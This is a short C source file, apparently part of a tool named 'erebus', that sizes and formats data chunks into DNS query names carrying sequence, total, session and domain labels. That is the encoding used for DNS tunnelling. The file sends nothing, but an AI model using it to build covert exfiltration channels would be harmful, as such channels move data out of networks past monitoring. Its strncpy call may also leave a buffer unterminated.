#include <stdio.h>
#include <string.h>

#include "erebus/dns_chunk.h"

int erebus_dns_max_chunk_len(const char *session_label, const char *domain) {
    size_t overhead = EREBUS_DNS_SEQ_WIDTH + 1 + EREBUS_DNS_TOTAL_WIDTH + 1 + 1 +
        strlen(session_label) + strlen(domain);
    if (overhead >= 253) return 0;
    int max_total = 253 - (int)overhead;
    return max_total > EREBUS_DNS_MAX_LABEL ? EREBUS_DNS_MAX_LABEL : max_total;
}

int erebus_dns_build_query(char *out, size_t out_cap, int seq, int total,
    const char *chunk, const char *session_label, const char *domain) {
    char dom[256];
    strncpy(dom, domain, sizeof(dom) - 1);
    if (dom[0] && dom[strlen(dom) - 1] != '.')
        strncat(dom, ".", sizeof(dom) - strlen(dom) - 1);
    return snprintf(out, out_cap, "%0*d.%0*d.%s.%s%s",
        EREBUS_DNS_SEQ_WIDTH, seq,
        EREBUS_DNS_TOTAL_WIDTH, total,
        chunk, session_label, dom) > 0;
}